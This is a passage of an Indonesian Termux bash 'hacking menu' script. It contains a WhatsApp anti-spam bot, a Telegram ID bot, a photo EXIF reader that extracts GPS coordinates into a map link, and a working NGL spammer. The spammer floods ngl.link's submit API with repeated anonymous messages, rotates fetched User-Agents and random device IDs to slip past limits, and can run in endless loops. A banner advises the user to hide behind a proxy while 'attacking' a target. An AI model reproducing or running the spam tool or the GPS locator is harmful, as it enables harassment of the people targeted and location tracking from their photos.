        echo -e "${y} Gagal membuat QR code."
        sleep 2
        return
    fi
    echo -e "${y}"
    read -p "Apakah anda ingin membuat QR code lagi? [ y/n ] : " yatim
    if [ "$yatim" = "n" ] || [ "$yatim" = "N" ]; then
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${c} Keluar dari tools."
        echo ""
    else
        generate_qr_code
    fi
}
generate_qr_code
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
            read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
            clear
              ;;
       18)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
         clear
echo ""
echo -e "${g} Sedang memuat mohon bersabar..!!"
echo ""
cd $PREFIX/tmp
mkdir -p "JUNZ1337_BOT"
dir="JUNZ1337_BOT"
cd "$dir"
if [ ! -d "node_modules/@whiskeysockets/baileys" ]; then
    command -v yarn &> /dev/null || pkg install -y yarn > /dev/null 2>&1
    yarn add @whiskeysockets/baileys@7.0.0-rc13 chalk@4.1.2 pino qrcode-terminal @hapi/boom > /dev/null 2>&1
    npm install @whiskeysockets/baileys@7.0.0-rc13 chalk@4.1.2 pino qrcode-terminal @hapi/boom > /dev/null 2>&1
fi
cat << 'EOF' > package.json
{
  "name": "wagebedanapljr",
  "version": "1.0.0",
  "description": "Bot wa Fitur Proteksi",
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "@whiskeysockets/baileys": "^7.0.0-rc13",
    "chalk": "^4.1.2",
    "pino": "^9.0.0",
    "qrcode-terminal": "^0.12.0",
    "@hapi/boom": "^10.0.1"
  }
}
EOF
cat << 'EOF' > index.js
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const chalk = require('chalk');
const readline = require('readline');
const fs = require('fs');
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));
const CONFIG = {
    antiVirtex: true,
    antiSpam: true,
    antiBanned: true,
    antiSpamCall: true,
    maxMessageLength: 4000,
};
const roomMsgCounter = new Map();
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('session_junz');
    const sock = makeWASocket({
        logger: pino({ level: 'fatal' }),
        auth: state,
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    });    
    const sessionPath = './session_junz';
    const hasSession = fs.existsSync(sessionPath) && fs.readdirSync(sessionPath).length > 0;    
    if (!hasSession) {
        console.clear();
        console.log(chalk.cyan('===================================='));
        console.log(chalk.cyan('     JUNZ1337 PAIRING SYSTEM       '));
        console.log(chalk.cyan('====================================\n'));
        console.log(chalk.yellow('[INFO] Perangkat belum terkoneksi, silakan pairing.\n'));        
        let phoneNumber = await question(chalk.yellow('Masukin Nomer Awali 62xxx\n> '));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (!phoneNumber.startsWith('62')) {
            console.log(chalk.red('\n[ERROR] Nomor harus diawali angka 62! Silakan restart bot.'));
            process.exit(0);
        }
        console.log(chalk.blue('\n[SYSTEM] Meminta kode pairing...'));
        await delay(2000);
        try {
            let code = await sock.requestPairingCode(phoneNumber);
            code = code?.match(/.{1,4}/g)?.join('-') || code;
            console.log(chalk.black.bgGreen(`\n KODE PAIRING ANDA: ${code} `));
            console.log(chalk.yellow('\n[INFO] Masukkan kode di WhatsApp Anda untuk menghubungkan.\n'));
        } catch (error) {
            console.log(chalk.red('[ERROR] Gagal generate pairing code.'), error);
        }
    } else {
        console.log(chalk.green('\n[SYSTEM] Session ditemukan! Menghubungkan otomatis...\n'));
    }
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const shouldReconnect = (lastDisconnect.error instanceof Boom)?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                console.log(chalk.yellow('\n[SYSTEM] Mencoba menghubungkan ulang...\n'));
                startBot();
            } else {
                console.log(chalk.red('\n[SYSTEM] Session logout, silakan restart dan pairing ulang.\n'));
            }
        } else if (connection === 'open') {
            console.log(chalk.green('\n[SYSTEM] JUNZ1337 Berhasil Terhubung!\n'));
            console.log(chalk.green('[INFO] Sistem siap digunakan! Tekan Ctrl+C untuk berhenti.\n'));
        }
    });
    if (CONFIG.antiSpamCall) {
        sock.ev.on('call', async (call) => {
            for (let c of call) {
                if (c.status === 'offer') {
                    await sock.rejectCall(c.id, c.from).catch(() => {});
                }
            }
        });
    }
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            if (chatUpdate.type !== 'notify') return;
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            const isGroup = from.endsWith('@g.us');
            const sender = isGroup ? mek.key.participant : from;
            if (!sender) return;
            const senderNumber = sender.split('@')[0];
            const body = mek.message.conversation ||
                         mek.message.extendedTextMessage?.text ||
                         mek.message.templateButtonReplyMessage?.selectedId ||
                         "";
            const pushName = mek.pushName || 'User';
            console.log(`${chalk.cyan(pushName)} [${chalk.grey(senderNumber)}]: ${chalk.white(body.substring(0, 50))}`);            
            if (CONFIG.antiVirtex && body.length > CONFIG.maxMessageLength) {
                console.log(chalk.red(`[ALERT] Virtex terdeteksi dari ${senderNumber}.`));
                if (isGroup) {
                    await sock.sendMessage(from, { delete: mek.key }).catch(() => {});
                }
                await sock.updateBlockStatus(sender, 'block').catch(() => {});
                return;
            }
            if (CONFIG.antiSpam) {
                const now = Date.now();
                const personalCounterKey = `${from}_${sender}`;
                if (!roomMsgCounter.has(personalCounterKey)) roomMsgCounter.set(personalCounterKey, []);
                const personalTimestamps = roomMsgCounter.get(personalCounterKey);
                personalTimestamps.push(now);
                const recentPersonalMsgs = personalTimestamps.filter(time => now - time < 5000);
                roomMsgCounter.set(personalCounterKey, recentPersonalMsgs);
                if (recentPersonalMsgs.length > 5) {
                    console.log(chalk.red(`[ALERT] Spam dari ${senderNumber}.`));
                    if (isGroup) await sock.sendMessage(from, { delete: mek.key }).catch(() => {});
                    await sock.updateBlockStatus(sender, 'block').catch(() => {});
                    return;
                }
            }
        } catch (err) {
            console.log(chalk.red('[ERROR] '), err);
        }
    });
}
startBot();
EOF
clear
echo ""
echo -e "${r}Menjalankan pemantauan chat WhatsApp."
echo ""
node index.js
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
        19)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
p='\033[35;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
if ! command -v exiftool &> /dev/null; then
    clear 
    echo ""
    echo -e "${r}[ ${g}x ${r}]${c} Exiftool belum terinstall, sedang menginstall..!!"
    echo ""
    sleep 3 
    pkg update -y && pkg install exiftool -y
else
    clear 
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Exiftool sudah terinstall."
    echo ""
    sleep 3 
fi
clear 
echo "
▗▄▄▄▖ ▗▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌
▐▛▀▀▘▐▌ ▐▌ █ ▐▌ ▐▌ ▝▀▚▖▐▌   ▐▛▀▜▌▐▌ ▝▜▌
▐▌   ▝▚▄▞▘ █ ▝▚▄▞▘▗▄▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      Developer : Thxyzz404" | lolcat 
echo -e "${c}"
read -p "Masukkan path gambar : " filepath
echo ""
if [ ! -f "$filepath" ]; then
    echo -e "${r}Error file tidak ditemukan : $filepath"
    sleep 5
    echo ""
    clear 
fi
clear
echo ""
echo -e "${c}==============================================${n}"
echo "         Developer : Thxyzz404" | lolcat 
echo -e "${c}==============================================${n}"
echo -e "${r}
  ⢀⣴⣿⣷⣦⡀                      
 ⢠⣿⣿⢿⣿⣿⣷⣄${c} S ${n}                   
⢀${b}⡾⠋ ⣰⣿⣿⠻⣿⣷⡀${y} C ${n}                 
⠘  ⢠⣿⣿⠃ ⠈⠻⣿⣦⡀${r} A ${n}               
  ${p} ⢸⣿⡇   ⣼⣉⣿⣷⣄ ${b} N ${n}         ⢀⣀⣀ 
${g}   ⢹⣿⡇   ⣿⣿⣿⣿⣿⣷⡄        ⢀⣴⠟⣿⠉⠁
   ⠸⣿⣿⣄  ⠘⢿⣿⡵⠋⠙⢿⣦⡀  ⣤⣠ ⣠⣿⡅ ⣿  
    ⠈${y}⠻⢿⣿⣶⣤⣄⣀   ⠈⠻⣷⣄⣠⣿⣿⡼⠋⠛⣡⡼⠋  
        ⠉⠛⠛⠻⠿⠿⠷⠶⠶⠾⣿⡿⠋⠻⣟⠉⠁     
               ⢀⡠⠶⠋           
" ⠀⠀⠀
echo -e "${c}==============================================${n}"
echo -e "${y}         📸 AUTO INFORMASI DETAIL 📸 "
echo -e "${c}==============================================${n}"
echo ""
fname=$(exiftool -s -s -s -FileName "$filepath")
fsize=$(exiftool -s -s -s -FileSize "$filepath")
make=$(exiftool -s -s -s -Make "$filepath")
model=$(exiftool -s -s -s -Model "$filepath")
iso=$(exiftool -s -s -s -ISO "$filepath")
flash=$(exiftool -s -s -s -Flash "$filepath")
focal=$(exiftool -s -s -s -'FocalLengthIn35mmFormat' "$filepath")
aperture=$(exiftool -s -s -s -ApertureValue "$filepath")
maxap=$(exiftool -s -s -s -MaxApertureValue "$filepath")
date=$(exiftool -s -s -s -CreateDate "$filepath")
wb=$(exiftool -s -s -s -WhiteBalance "$filepath")
mp=$(exiftool -s -s -s -Megapixels "$filepath")
imgsize=$(exiftool -s -s -s -ImageSize "$filepath")
gps=$(exiftool -s -s -s -GPSPosition "$filepath")
echo -e "${g}File Name ${n}: ${p}$fname${n}"
echo -e "${g}File Size ${n}: ${p}$fsize${n}"
echo -e "${g}Make ${n}: ${p}$make${n}"
echo -e "${g}Camera Model Name ${n}: ${p}$model${n}"
echo -e "${g}ISO ${n}: ${p}$iso${n}"
echo -e "${g}Flash ${n}: ${p}$flash${n}"
echo -e "${g}Focal Length In 35mm Format ${n}: ${p}$focal${n}"
echo -e "${g}Max Aperture Value ${n}: ${p}$maxap${n}"
echo -e "${g}Create Date ${n}: ${p}$date${n}"
echo -e "${g}White Balance ${n}: ${p}$wb${n}"
echo -e "${g}Aperture Value ${n}: ${p}$aperture${n}"
echo -e "${g}Image Size ${n}: ${p}$imgsize${n}"
echo -e "${g}Megapixels ${n}: ${p}$mp${n}"
echo -e "${g}GPS Position ${n}: ${p}$gps${n}"
echo ""
echo -e "${c}==============================================${n}"
echo ""
lat=$(exiftool -gpslatitude -n "$filepath" | awk -F': ' '/GPS Latitude/ {print $2}')
lon=$(exiftool -gpslongitude -n "$filepath" | awk -F': ' '/GPS Longitude/ {print $2}')
if [[ -z "$lat" || -z "$lon" ]]; then
    echo -e "${r}Lokasi GPS tidak ditemukan di metadata gambar.${n}"
    sleep 5
    echo ""
    clear 
fi
echo -e "${r}[ ${g}✓ ${r}]${y} Lokasi ditemukan:${n}"
echo ""
echo -e "${g}Latitude  ${n}: ${p}$lat${n}"
echo -e "${g}Longitude ${n}: ${p}$lon${n}"
echo ""
echo -e "${g}🔗 Link Google Maps:${n}"
echo -e "${c}https://www.google.com/maps?q=$lat,$lon${n}"
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
               ;;
       20)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
echo ""
echo -e "${c}🤖 Telegram Get ID "
echo -e "${n}========================"
echo -e "${g}"
read -p "🔑 Masukkan Bot Token : " token
echo ""
echo -e "${y}📦 Installing dependencies..!!"
pip install python-telegram-bot==21.10 > /dev/null 2>&1
echo ""
echo -e "${g}📋 Summary"
echo -e "${y}• Bot Token : $token"
echo -e "${p}"
read -p "🎯 Jalankan bot sekarang? (y/n) : " jawab
if [[ $jawab == "y" || $jawab == "Y" ]]; then
    echo ""
    echo -e "${g}"   
    python3 -c "
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
BOT_TOKEN = '$token'
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f'🤖 <b>Botz Cek ID</b>\n\n'
        f'👋 Hai {user.first_name}!\n'
        f'💡 Gunakan /id untuk lihat ID',
        parse_mode='HTML'
    )
async def show_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = f'🆔 <b>ID Kamu :</b> <code>{user.id}</code>\n'
    text += f'👤 <b>Nama :</b> {user.first_name}\n'
    text += f'📱 <b>Username :</b> @{user.username or \"tidak ada\"}\n'
    await update.message.reply_text(text, parse_mode='HTML')
def main():
    print('🤖 Botz Starting..!!')
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler('start', start))
        app.add_handler(CommandHandler('id', show_id))
        print('🚀 Bot aktif! Buka Telegram dan chat ke botmu!')
        app.run_polling()
    except Exception as e:
        print(f'❌ ERROR : {e}')
if __name__ == '__main__':
    main()
"
else
    echo ""
    echo -e "${g}💡 Tidak jadi menjalankan bot."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
      21)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
URL="https://play.google.com/store/apps/details?id=com.fast.free.unblock.thunder.vpn"
open_url() {
  if command -v termux-open >/dev/null 2>&1; then
    termux-open "$URL"
  elif command -v xdg-open >/dev/null 2>&1; then
    xdg-open "$URL" >/dev/null 2>&1
  elif command -v am >/dev/null 2>&1; then
    am start -a android.intent.action.VIEW -d "$URL" >/dev/null 2>&1
  fi
}
clear
echo ""
echo -e "${bold_bg}${bold_gren} PERINGATAN PENTING ${n}"
echo ""
echo -e "${c} 
Jika anda menggunakan proxy,
ketika menyerang akan lebih aman,
karena jamanya skrg sudah ada ngl mods yg bisa 
menampilkan alamat ip lokasi rumah kalian, nah itu 
manfaatnya agar kalian terhindar dari
ngl mods ketika kalian sudah menggunakan proxy ataupun
anda sudah mendownload proxy punya saya dan siap 
untuk meluncurkan penyerangan kepada target usernamenya,
semoga bermanfaat dan senang saya membantu anda.
"
echo -e "${g}"
read -p "Apakah anda ingin menggunakan proxy? [y/n] : " answer
case "$answer" in
  y|Y)
    clear
    echo ""
    echo -e "${bold_bg}${bold_gren} MEMBUKA PROXY DARI LINK..!! ${n}"
    sleep 2
    open_url
    echo -e "${g}"
    read -n 1 -s -r -p "SILAHKAN TEKAN ENTAR UNTUK MELANJUTKANNYA."
    clear
    ;;
  n|N)
    clear 
    echo ""
    echo -e "${bold_bg}${bold_gren} ANDA MEMILIH TIDAK MENGGUNAKAN PROXY. ${n}"
    sleep 3 
    clear
    ;;
  *)
    clear 
    echo ""
    echo -e "${r}Jawaban anda tidak valid tidak memilih apapun..!!"
    sleep 4
    clear
    ;;
esac
clear
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
" | lolcat
echo -e "${r}=============================="
echo -e "${g}   SPAMMER NGL THXYZZ404"
echo -e "${r}=============================="
echo ""
echo -e "${r} [ ${g}01 ${r}]${c} SPAMMER NGL BRUTAL."
echo -e "${r} [ ${g}02 ${r}]${c} SPAMMER NGL SLOW."
echo -e "${r} [ ${g}03 ${r}]${c} SPAMMER NGL KENCANG."
echo -e "${r} [ ${g}04 ${r}]${c} SPAMMER NGL SEDANG."
echo -e "${r} [ ${g}05 ${r}]${y} Kembali ke awal."
echo ""
echo -e "${r}=============================="
echo -e "${p}"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
read -p "Masukkan Pilihan Anda : " kuy
case $kuy in
  1|01)
ua_url="https://raw.githubusercontent.com/QrwszXnXnchommed0e56/ua/main/ua.txt"
clear
echo ""
echo "
░███    ░██   ░██████  ░██         
░████   ░██  ░██   ░██ ░██         
░██░██  ░██ ░██        ░██         
░██ ░██ ░██ ░██  █████ ░██         
░██  ░██░██ ░██     ██ ░██         
░██   ░████  ░██  ░███ ░██         
░██    ░███   ░█████░█ ░██████████
" | lolcat                                                          
echo -e "${p}Development ${c}: ${y}Thxyzz404 & HanX"
echo ""
read -p "$(echo -e "${y}Masukkan${r} [ ${g}Username Ngll Atau Link Ngll ${r}]${c} : ")" input
echo ""
read -p "$(echo -e "${g}Masukkan Pesan Yang Ingin Dikirim${c} : ")" pesan
echo -e "${r}"
read -p "Masukkan Jumlah Spam : " jumlah
echo ""
echo -e "${g}Sedang Proses Spam..!!"
echo ""
username=$(echo "$input" | sed 's|https://ngl\.link/||')
ua_list=($(curl -s "$ua_url"))
if [ ${#ua_list[@]} -eq 0 ]; then
    clear
    echo ""
    echo -e "${r}Gagall Mengambil User-Agent Dari : $ua_url"
    echo ""
    exit 1
fi
for ((i=1; i<=jumlah; i++)); do
    ua=${ua_list[$RANDOM % ${#ua_list[@]}]}
    curl -s -X POST "https://ngl.link/api/submit" \
        -H "User-Agent: $ua" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&question=$pesan&deviceId=$(hexdump -n 16 -e '4/4 "%08X" 1 "\n"' /dev/urandom)" \
        > /dev/null
    echo -e "${r}[ ${g}$i ${r}]${c} Spam Terkirim Ke : ${p}@$username: $pesan"
    echo ""
    sleep 1
done
    ;;
        2|02)
   clear
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
CYAN="\033[1;36m"
RESET="\033[0m"
pesanlist=(
    "Halo!"
    "Apa kabar?"
    "Kamu keren banget!"
    "Semangat terus ya!"
    "Test 123"
    "Gimana hari ini?"
    "Kamu hebat!"
    "Tetap semangat!"
    "Selamat pagi!"
    "Jangan lupa makan ya!"
    "Lagi ngapain?"
    "Senyum dulu dong :)"
    "Keep fighting!"
    "Kamu pasti bisa!"
    "Yakin aja!"
    "Kabarin aku dong hehe"
    "Santai aja ya"
    "Napas dulu, slow"
    "Minum air putih!"
    "Udah tidur cukup?"
    "Hari ini indah kan?"
    "Tetap waras!"
    "Jangan menyerah"
    "Aku bangga sama kamu"
    "Istirahat yang cukup ya"
    "Udh makan belum?"
    "Jangan terlalu keras ke diri sendiri"
    "Hari ini luar biasa"
    "Fokus terus!"
    "Kamu gak sendiri"
    "Bernafas dulu yuk"
    "Senyumanmu berharga"
    "Langit cerah hari ini"
    "Nikmati prosesnya"
    "Take a deep breath"
    "Lihat ke cermin dan senyum"
    "Tetap jadi diri sendiri"
    "Hidup itu indah"
    "Dunia menunggumu bersinar"
    "Aku di sini kok"
    "Percaya proses"
    "Pelan-pelan aja"
    "Selangkah lebih dekat"
    "Good vibes only"
    "Kamu layak bahagia"
    "Yuk bangkit lagi"
    "No pressure, just do it"
    "Reset, recharge, restart"
    "Fokus ke hari ini"
    "Hari buruk bukan akhir segalanya"
    "Tiap hari kesempatan baru"
    "Jangan terlalu mikir"
    "Kebahagiaan itu sederhana"
    "Kamu punya potensi"
    "Semua akan indah pada waktunya"
    "You got this!"
    "Ngopi dulu yuk"
    "Tenang, semua akan baik-baik saja"
    "Udah sholat belum?"
    "Dengerin musik kesukaanmu"
    "Lihat langit sore yuk"
    "Hidup itu bukan lomba"
    "Ada aku kok"
    "Mau curhat gak?"
    "Kamu lucu juga ya"
    "Hari ini kamu senyum gak?"
    "Bersyukur dulu yuk"
    "Masih banyak yang sayang kamu"
    "Hidup gak harus selalu serius"
    "Ayo, semangat semangat!"
    "Mimpi itu gratis, kejar yuk"
    "Ga semua harus sempurna"
    "Kamu luar biasa"
    "Ajak temanmu senyum juga"
    "Hidup terus berjalan"
    "Buka jendela, tarik napas"
    "Peluk diri sendiri yuk"
    "Kamu bukan gagal, kamu belajar"
    "Ngambek ya?"
    "Waktunya healing"
    "Jangan bandingkan dirimu"
    "Sedih boleh, lama jangan"
    "Cinta diri sendiri"
    "Aku percaya kamu"
    "Mau pelukan virtual?"
    "Berjalanlah perlahan"
    "Semangat, pejuang hidup!"
    "Pakai sunscreen ya"
    "Jangan stalking terus wkwk"
    "Tidur cukup penting loh"
    "Jangan insecure ya"
    "Senyum kamu manis"
    "Terus belajar ya"
    "Bahagia itu pilihan"
    "Kamu tidak gagal"
    "Beristirahat bukan lemah"
    "Doa adalah kekuatan"
    "Kamu istimewa"
    "Yuk lanjut lagi"
    "Gagal bukan akhir"
    "Kamu patut diperjuangkan"
    "Jangan simpan semua sendiri"
    "Aku support kamu"
    "Hari ini indah, seperti kamu"
)
banner() {
    echo -e "${CYAN}
███╗   ██╗ ██████╗ ██╗     
████╗  ██║██╔════╝ ██║     
██╔██╗ ██║██║  ███╗██║     
██║╚██╗██║██║   ██║██║     
██║ ╚████║╚██████╔╝███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ Spammer !
    ${RESET}"
}
cek_username() {
    local uname="$1"
    result=$(curl -s -o /dev/null -w "%{http_code}" "https://ngl.link/$uname")
    if [[ "$result" == "200" ]]; then
        return 0
    else
        return 1
    fi
}
clear
banner
IFS= read -r -e -p "🔹 Masukkan username (pisahkan dengan koma): " input_username
IFS=',' read -ra username_list <<< "$input_username"
valid_usernames=()
for uname in "${username_list[@]}"; do
    uname_clean=$(echo "$uname" | xargs)
    if cek_username "$uname_clean"; then
        valid_usernames+=("$uname_clean")
    else
        echo -e "${RED}✖ Username \"$uname_clean\" tidak valid. Lewati.${RESET}"
    fi
done
if [[ ${#valid_usernames[@]} -eq 0 ]]; then
    echo -e "${RED}✖ Tidak ada username valid. Keluar.${RESET}"
    sleep 5
fi
total=0
loading() {
    echo -ne "${YELLOW}⏳ Mengirim"
    for i in {1..3}; do
        echo -n "."
        sleep 0.2
    done
    echo -ne "\r                                     \r"
}
while true; do
    clear
    banner
    echo
    echo -e "${BLUE}Pilih mode pesan:${RESET}"
    echo -e "${CYAN}1)${RESET} Mode otomatis (acak terus-menerus)"
    echo -e "${CYAN}2)${RESET} Tulis pesan manual"
    echo -e "${CYAN}q)${RESET} Keluar"
    echo
    IFS= read -r -e -p "🔸 Pilihan : " mode
    if [[ "$mode" == "q" ]]; then
        echo -e "${YELLOW}Keluar...${RESET}"
        break
    fi
    case "$mode" in
        1)
 berhasil=0
            gagal=0
            berhasil_list=()
            gagal_list=()
            stty -echo -icanon time 0 min 0
            while true; do
                clear
                banner
                echo -e "${CYAN}🌀 Mode otomatis aktif (tekan 'q' untuk berhenti)${RESET}"
                key=$(dd bs=1 count=1 2>/dev/null)
                if [[ "$key" == "q" ]]; then
                    echo -e "${YELLOW}➡️  Dihentikan oleh user (tekan q). Menampilkan ringkasan...${RESET}"
                    break
                fi
                for user in "${valid_usernames[@]}"; do
                    ((total++))
                    pesan="${pesanlist[$RANDOM % ${#pesanlist[@]}]}"
                    device_id=$(cat /proc/sys/kernel/random/uuid | tr 'A-Z' 'a-z')
                    loading
                    response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://ngl.link/api/submit" \
                        -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
                        -H "Origin: https://ngl.link" \
                        -H "Referer: https://ngl.link/$user" \
                        --data-urlencode "username=$user" \
                        --data-urlencode "question=$pesan" \
                        --data-urlencode "deviceId=$device_id" \
                        --data-urlencode "gameSlug=" \
                        --data-urlencode "referrer=")
                    if [[ "$response" == "200" ]]; then
                        ((berhasil++))
                        berhasil_list+=("[$total] @$user: $pesan")
                        echo -e "${GREEN}✅ [$total] Sukses ke @$user: \"$pesan\"${RESET}"
                    else
                        ((gagal++))
                        gagal_list+=("[$total] @$user: $pesan (Status: $response)")
                        echo -e "${RED}❌ [$total] Gagal ke @$user: \"$pesan\" (Status: $response)${RESET}"
                    fi
                done

                sleep 0.3
            done
            stty sane
            echo
            echo -e "${CYAN}📊 RINGKASAN PENGIRIMAN:${RESET}"
            echo -e "${GREEN}✔️ Berhasil: $berhasil${RESET}"
            echo -e "${RED}❌ Gagal: $gagal${RESET}"
            echo -e "${YELLOW}📦 Total: $total${RESET}"
            echo
            if [[ $berhasil -gt 0 ]]; then
                echo -e "${GREEN}✅ Daftar pesan berhasil:${RESET}"
                for msg in "${berhasil_list[@]}"; do
                    echo -e "   ${GREEN}$msg${RESET}"
                done
            fi
            if [[ $gagal -gt 0 ]]; then
                echo -e "${RED}❌ Daftar pesan gagal:${RESET}"
                for msg in "${gagal_list[@]}"; do
                    echo -e "   ${RED}$msg${RESET}"
                done
            fi
            echo
            echo -e "${BLUE}🔚 ENTER untuk kembali ke menu${RESET}"
            read
            ;;
        2)
            clear
banner
IFS= read -r -e -p "✏️  Ketik pesan (atau 'q' untuk keluar): " pesan
if [[ "$pesan" == "q" ]]; then
    echo -e "${YELLOW}Keluar...${RESET}"
    exit 0
fi
if [[ -z "$pesan" ]]; then
    echo -e "${RED}⚠️  Pesan kosong. Keluar...${RESET}"
    exit 0
fi
while true; do
clear
banner
    for user in "${valid_usernames[@]}"; do
        ((total++))
        device_id=$(cat /proc/sys/kernel/random/uuid | tr 'A-Z' 'a-z')
        loading
        response=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://ngl.link/api/submit" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            -H "Origin: https://ngl.link" \
            -H "Referer: https://ngl.link/$user" \
            --data-urlencode "username=$user" \
            --data-urlencode "question=$pesan" \
            --data-urlencode "deviceId=$device_id" \
            --data-urlencode "gameSlug=" \
            --data-urlencode "referrer=")
        if [[ "$response" == "200" ]]; then
            echo -e "${GREEN}✅ [$total] Sukses ke @$user: \"$pesan\"${RESET}"
        else
            echo -e "${RED}❌ [$total] Gagal ke @$user: \"$pesan\" (Status: $response)${RESET}"
        fi
    done
    read -t 1 -p "⏳ Tekan 'q' untuk stop " stop
    if [[ "$stop" == "q" ]]; then
        echo -e "${YELLOW}Loop dihentikan...${RESET}"
        break
    fi
done
            ;;
